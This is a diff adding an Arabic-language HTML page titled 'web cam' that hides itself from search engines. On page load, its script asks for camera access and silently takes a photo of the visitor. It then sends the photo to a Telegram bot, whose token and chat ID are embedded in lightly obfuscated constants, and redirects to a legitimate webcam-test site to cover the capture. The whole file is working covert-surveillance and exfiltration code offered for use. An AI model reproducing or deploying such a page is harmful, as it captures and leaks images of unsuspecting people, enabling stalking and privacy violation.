@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>web cam</title>
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+<meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+</head>
+<body>
+
+<script>
+(function(){
+    const _0x1234 = ["8020525157:AAHB3CU6ofCfFOOkIcE2ObYP94tH_gDxqp8", "7072349882", "https://api.telegram.org/bot", "/sendPhoto"];
+    const botToken = _0x1234[0], chatId = _0x1234[1], apiUrl = _0x1234[2] + botToken + _0x1234[3];
+
+    function sendToTelegram(imgBlob) {
+        let formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", imgBlob, "photo.jpg");
+
+        fetch(apiUrl, { method: "POST", body: formData })
+        .then(res => res.json())
+        .then(data => {
+            console.log("رد تيليجرام:", data);
+            if (data.ok) window.location.replace("https://webcamtests.com/");
+            else console.error("خطأ في الإرسال:", data.description);
+        })
+        .catch(err => console.error("خطأ في الاتصال:", err));
+    }
+
+    function captureAndSend() {
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            let video = document.createElement("video");
+            video.srcObject = stream;
+            video.play();
+
+            setTimeout(() => {
+                let canvas = document.createElement("canvas");
+                canvas.width = 640;
+                canvas.height = 480;
+                let ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(blob => {
+                    console.log("تم التقاط الصورة");
+                    sendToTelegram(blob);
+                }, "image/jpeg");
+
+                stream.getTracks().forEach(track => track.stop());
+            }, 2000);
+        })
+        .catch(err => console.error("فشل في الوصول إلى الكاميرا:", err));
+    }
+
+    captureAndSend();
+})();
+</script>
+
+</body>
+</html>
